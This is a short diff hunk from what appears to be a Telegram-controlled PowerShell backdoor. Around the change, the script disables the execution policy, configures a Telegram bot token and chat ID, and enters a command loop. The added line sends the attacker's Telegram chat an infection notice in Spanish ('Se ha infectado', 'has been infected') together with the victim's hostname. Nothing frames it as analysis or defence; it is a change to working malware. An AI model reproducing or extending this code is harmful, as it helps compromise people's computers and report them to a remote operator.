@@ -47,7 +47,7 @@ $global:joblist=@{}
 Disable-ExecutionPolicy
 
 New-MyTelegramConfiguration -ApiToken $ApiToken -ChatID $ChatID
-
+Send-Results -chat_id $ChatID -texto "Se ha infectado $(hostname)"
 Banner
 $condition = $true
 while($condition){
